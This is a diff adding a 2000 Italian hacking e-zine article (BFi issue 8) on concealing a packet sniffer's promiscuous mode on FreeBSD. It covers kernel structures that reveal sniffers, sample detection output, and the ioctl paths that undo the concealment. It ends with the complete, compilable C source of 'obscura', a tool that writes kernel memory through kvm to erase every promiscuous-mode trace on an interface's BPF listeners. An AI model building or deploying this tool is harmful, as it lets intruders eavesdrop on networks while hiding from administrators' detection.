@@ -1,0 +1,353 @@
+==============================================================================
+------------[ BFi numero 8, anno 3 - 30/04/2000 - file 12 di 28 ]-------------
+==============================================================================
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ FADE TO BLACK DEL PROMISC MODE... MA...  
+-----[ pIGpEN <pigpen@s0ftpj.org> <deadhead@sikurezza.org>
+
+
+MUSICA ASCOLTATA:
+
+	Grateful Dead in concerto al
+	The Great American Music Hall
+	13 Agosto 1975
+
+	Grateful Dead in concerto al
+	Babylonian theater (the Fox) in St.Louis
+	Febbraio 1970
+
+Bau,
+
+FuSyS mi fece notare l'articolo numero 10 scritto su Phrack 53 in cui si parla
+di coprire il promisc mode di un'interfaccia di rete accedendo direttamente al
+kernel, in BSD tramite kvm...
+
+In realta' e' vero che si puo' coprire l'IFF_PROMISC agendo su if_flags della
+ifnet interessata... Tuttavia questo non basta, per 2 ragioni:
+
+- leggendo if_pcount della ifnet si puo' sapere il numero dei
+  listener in promisc mode 
+
+- sui descrittori dei files aperti del descrittore if_bpf di
+  quell'interfaccia (lo so suona male ma e' cosi' :) 
+  esiste un flag (bd_promisc) settato a 1 se su quel /dev/bpf*  
+  si sta leggendo in modalita' promiscua... 
+
+Ora, mentre ifconfig viene gabbato abbastanza semplicemente via ioctl() che
+copre l'IFF_PROMISC o togliendo l'IFF_PROMISC tra i flags di quella 
+interfaccia via /dev/mem, sul kernel restano invece ancora delle evidenti 
+tracce...
+
+Sto realizzando un tool che permette, oltre ad altre cose, di trovare il 
+promisc mode in locale in modo abbastanza sicuro e la cui discussione
+sara' trattata sul numero 9 di BFi (da remoto esistono tool come quello dei
+l0pht, ma la loro spiegazione non rientra in questo articolo: visto che ci 
+siete leggete pure TCP FOR PHUN AND PROFIT in BFi#5)
+
+Per ora supponiamo di avere tre dumper su un'interfaccia (assurdo o no 
+immaginiamolo lo stesso... capirete il perche' dall'output), 2 in modalita'
+promiscua ed 1 no:
+
+(L'indirizzo della scheda di rete e' stato cambiato per motivi di privacy :)
+
+./k -i ed0
+
+Interface: ed0 (internal index = 1) ( Ether 00:4d:4c:05:3b:30 )
+State: up bcast running promisc simplex multicast  
+Addr: 192.168.1.2 Nmask: 0xffffff00 Bcast: 192.168.1.255 
+Expected 2 promisc listener/s
+Found a promisc   listener: (1 rcvd pkt, 0 drop pkt) on  #1 listener
+Found a nopromisc listener: (1 rcvd pkt, 0 drop pkt) on  #2 listener
+Found a promisc   listener: (1 rcvd pkt, 0 drop pkt) on  #3 listener
+Information for this Ethernet interface:
+	(address length = 6, header length = 14)
+	MTU:       1500	Linespeed: 10000000
+	63 packets received, 58 packets sent
+	0 input errors, 0 output errors on interface
+	0 collisions on interface
+	8853 octets received, 8411 octets sent
+	9 packets received, 0 packets sent via multicast
+	0 dropped on input
+	0 destined for unsupported protocols
+
+Se usassi il tool di phrack sulla riga di State scomparirebbe il flag 
+promisc... ma il mio prog vede cmq 2 listeners in promisc mode e i 
+pacchetti passati su quei descrittori...
+
+E' chiaro quindi che non copro molto...
+
+La domanda e': si puo' coprire tutto?
+
+La risposta e' no...
+Fino a quando esiste un descrittore si puo' sempre scoprire che c'e' un
+dumper sotto; possiamo pero' fare in modo che questo si spacci per un dumper
+non in promisc mode per un po' di tempo.
+D'altronde e' chiaro capire che piu' di cosi' non si puo' fare perche' se 
+tolgo il descrittore dico addio all'output sul dumper.
+
+./obscura ed0
+
+ed0 found ... promisc mode (found)
+BPF Analysis for ed0 interface:
+#1 listener has  promisc mode enabled (changed)
+#2 listener has no promisc mode enabled
+#3 listener has  promisc mode enabled (changed)
+skipping -> lp0
+skipping -> tun0
+skipping -> sl0
+skipping -> ppp0
+skipping -> lo0
+
+./k -i ed0
+
+Interface: ed0 (internal index = 1) ( Ether 00:4d:4c:05:3b:30 )
+State: up bcast running simplex multicast  
+Addr: 192.168.1.2 Nmask: 0xffffff00 Bcast: 192.168.1.255 
+Found a nopromisc listener: (8 rcvd pkt, 0 drop pkt) on  #1 listener
+Found a nopromisc listener: (8 rcvd pkt, 0 drop pkt) on  #2 listener
+Found a nopromisc listener: (8 rcvd pkt, 0 drop pkt) on  #3 listener
+Information for this Ethernet interface:
+	(address length = 6, header length = 14)
+	MTU:       1500	Linespeed: 10000000
+	67 packets received, 61 packets sent
+	0 input errors, 0 output errors on interface
+	0 collisions on interface
+	9674 octets received, 9017 octets sent
+	11 packets received, 0 packets sent via multicast
+	0 dropped on input
+	0 destined for unsupported protocols
+
+
+Addio promisc mode :O
+
+Utilizzando obscura modifico i valori sul kernel bypassando le funzioni di
+gestione dell'interfaccia per cui l'allframes bit nell'interfaccia dovrebbe
+rimanere settato (in quanto le funzioni di gestione del driver non hanno avuto
+modo di pulire il bit)... 
+Tuttavia c'e' un MA: vale solo fino alla prossima ioctl(SIOCSIFFLAGS) o 
+ioctl(SIOCSIFFADDR) su quella interfaccia (e altri casi indicati sotto) la 
+prima citata in Phrack e la seconda aggiunta per ovvi motivi.
+
+Nel commento del sorgente trovate il test che viene eseguito quando viene
+trovata una ioctl() di questi tipi sul device e che comporta la disattivazione
+del bit di allframes.
+
+Un'ultima nota su come il kernel tira giu' un dumper: in pratica la 
+ifpromisc(), quando le viene richiesto di togliere il promisc mode
+su un'interfaccia, fa il seguente test:
+
+if(--ifp->if_pcount > 0)
+	return 0;
+
+ifp->if_flags &= ~IFF_PROMISC;
+
+ifr.if_flags = ifp_if_flags;
+
+(*ifp->if_ioctl) (ifp, SIOCSIFFLAGS, (caddr_t)&ifr);
+
+Per cui, se noi settiamo if_pcount come un numero abbastanza grande, e' facile
+pensare che nel caso di chiusura di un dumper se ce ne sono altri (magari con 
+promisc mode coperto) questi continueranno a godere della modalita' promiscua.
+
+In realta' questo non serve perche' la ifpromisc() e' chiamata nella funzione 
+bpf_detachd() che prima di eseguirla controlla che bd_promisc sia > 0 ed 
+avendolo azzerato tale funzione non sara' mai chiamata.
+
+Quindi, se per la chiusura di un dumper non ci sono problemi, le situazioni in
+cui una if_ioctl() viene chiamata e non si puo' far molto sono le seguenti:
+
+- Richieste da userlevel tramite ioctl() di questi tipi (ovviamente su
+  quell'interfaccia) eventualmente filtrabili via kld o lkm:
+
+ Chiamate:
+                        livello di	
+   user level		   rete			driver
+
+   SIOCSIFFLAGS		ifioctl()		(if)_ioctl()	
+   (SIOCSIFPHYS)	ifioctl()		  *
+   SIOCSIFADDR		ether_ioctl()		(if)_init()
+			iso88025_ioctl()
+   SIOCADDMULTI		if_addmulti()		(if)_ioctl(SIOCSIFFLAGS)
+   SIOCDELMULTI		if_addmulti()		(if)_ioctl(SIOCSIFFLAGS)
+   BIOCPROMISC		ifpromisc()		(if)_ioctl(SIOCSIFFLAGS)
+
+* = non supportata completamente
+
+(if)_ioctl ha if tra parentesi in quanto il suo nome varia dal driver per 
+quella scheda di rete.
+
+- Situazioni generiche e non sempre prevedibili: 
+ 
+ Chiamate nel kernel alle seguenti funzioni:
+
+	if_allmulti() --> in quanto chiama una if_ioctl(SIOCSIFFLAGS)
+	if_slowtimo() --> in quanto chiama la if_watch() che a sua volta 
+			  inizializza l'interfaccia (a livello di driver)
+	bpf_detachd() --> (chiama la ifpromisc()) no problem bypassata	
+
+Il codice:
+
+<-| obscura.c |->
+/*
+ * Name: Total obscurity for BPF Promisc Mode
+ * Date: Sat Mar 25 16:40:12 2000
+ * Author: pIGpEN [ pigpen@s0ftpj.org, deadhead@sikurezza.org ]
+ *
+ * SoftProject 2000 - Digital Sekurity for Y2k
+ * Sikurezza.org - Italian Security MailingList
+ *
+ * COFFEE-WARE LICENSE - This source code is like "THE BEER-WARE LICENSE" by
+ * Poul-Henning Kamp <phk@FreeBSD.ORG> but you can give me in return a coffee.
+ *
+ * Tested on: FreeBSD 3.4-RELEASE FreeBSD 3.4-RELEASE #4: Fri Mar i386
+ *
+ * Give more obscurity of P53-10 tools... note here as in apk's code if we 
+ * change IFF_PROMISC in ifnet structure .... 
+ * when your System calls a ioctl(SIOCSIFFLAGS) for that interface, it invokes  
+ * if_ioctl() and allframes bit for that device will be disabled because test 
+ * in init function is done for example in this way:
+ *
+ * if(ifp->if_flags & IFF_PROMISC) {
+ *	AL_SETBIT(sc, AL_NETCFG, AL_NETCFG_RX_PROMISC);
+ * } else {
+ *	AL_CLRBIT(sc, AL_NETCFG, AL_NET_CFG_RX_PROMISC);
+ * }
+ *
+ * SIOCSIFFLAGS is not the only situation for a call to init function for that
+ * device (see BFi-8 for further information)
+ *
+ * This code was written in order to test a my tool ... Modification or use of
+ * this source code is intended only for legal purposes, It was coded for no
+ * malicious aims.. perhaps it doesn't work ;)
+ *
+ * 
+ * Compile with: cc obscura.c -lkvm
+ *
+ */
+
+
+#include <stdio.h>
+#include <string.h>
+#include <sysexits.h>
+#include <err.h>
+#include <fcntl.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <net/if.h>
+#include <net/if_var.h>
+#include <net/bpfdesc.h>
+#include <nlist.h>
+#include <kvm.h>
+
+#define	Error(x)	errx(EX_UNAVAILABLE, x);
+
+void	usage		__P((char *));
+void	bpf_zero	__P((kvm_t *, struct ifnet *));
+
+struct nlist list[] = {
+	{"_ifnet"},
+	{NULL}
+};
+
+int 
+main(int argc, char **argv)
+{
+	struct ifnethead ifh;
+	struct ifnet ifc, *ifp;
+	char ifname[IFNAMSIZ];
+	kvm_t *kd;
+	
+	if(argc!=2)
+		usage(argv[0]);
+
+	if(!(kd=kvm_open(NULL, NULL, NULL, O_RDWR, NULL)))
+		Error("kvm_open()");
+
+	if(kvm_nlist(kd, list) == -1)
+		Error("kvm_nlist()");
+
+	if(!list[0].n_value)
+		Error("checking n_value");
+
+	kvm_read(kd, list[0].n_value, &ifh, sizeof ifh);
+	ifp = ifh.tqh_first;
+
+	for(;ifp;ifp = ifc.if_link.tqe_next) {
+
+		kvm_read(kd, (u_long)ifp, &ifc, sizeof ifc);	
+		kvm_read(kd, (u_long)ifc.if_name, ifname, sizeof ifname);
+		snprintf(ifname, IFNAMSIZ, "%s%d", ifname, ifc.if_unit);
+	
+		if(!strcmp(ifname, argv[1])) {
+			printf("%s found ... promisc mode ", ifname);
+			if(ifc.if_flags & IFF_PROMISC) {
+				printf("(found)\n");
+				if(ifc.if_pcount) 
+				/* I clear this ...  
+			 	 * you can do a perfect thing by changing this
+			 	 * in bpf_zero() decreasing for each descriptor
+			 	 * found ...
+			 	 */ 
+					ifc.if_pcount = 0;
+				ifc.if_flags &= ~IFF_PROMISC;
+				kvm_write(kd, (u_long)ifp, &ifc, sizeof ifc);
+				printf("BPF Analysis for %s interface\n",
+					ifname);
+				bpf_zero(kd, &ifc);
+			}else
+				printf("(not found)\n");
+			
+		} else
+			printf("skipping -> %s\n", ifname);
+
+
+	}
+
+	kvm_close(kd);
+	return 0;
+	
+}
+
+void
+usage(char *name)
+{
+	printf("FreeBSD - Promisc Total Obscurity\n"
+	       "Warning this tool is intended for testing of ks...\n"
+	       "Don't use it for illegal purposes\n\n"
+	       "pIGpEN [ pigpen@s0ftpj.org, deadhead@sikurezza.org ]\n\n");
+	printf("Usage: %s interface\n", name);
+	exit(1);
+}
+
+void
+bpf_zero(kvm_t *kd, struct ifnet *ifp)
+{
+	struct bpf_if	ibpf;
+	struct bpf_d	dbpf, *pdbpf;
+	register int count = 0;
+
+	kvm_read(kd, (u_long)ifp->if_bpf, &ibpf, sizeof ibpf);
+	pdbpf = ibpf.bif_dlist;
+
+	for(; pdbpf; pdbpf = dbpf.bd_next) {
+		kvm_read(kd, (u_long)pdbpf, &dbpf, sizeof dbpf);
+		printf("#%d listener has %spromisc mode enabled", 
+				++count, (!dbpf.bd_promisc) ? "no " : " ");
+
+		if(dbpf.bd_promisc) {
+			printf(" (changed)");
+			dbpf.bd_promisc = 0;
+			kvm_write(kd, (u_long)pdbpf, &dbpf, sizeof dbpf);
+		}
+
+		putchar('\n');
+	}
+}
+<-X->
+
+
+==============================================================================
+--------------------------------[ EOF 12/28 ]---------------------------------
+==============================================================================
